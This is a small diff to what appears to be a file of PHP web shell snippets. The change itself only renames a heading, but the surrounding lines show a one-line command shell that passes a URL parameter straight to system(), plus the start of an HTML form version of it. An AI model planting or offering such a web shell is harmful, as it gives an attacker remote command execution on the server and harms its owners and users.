@@ -2,7 +2,7 @@ PHP CMD one line :
 
 <?php system($_GET['cmd']); ?>
 
-PHP code:
+PHP CMD code:
 <html>
 <body>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
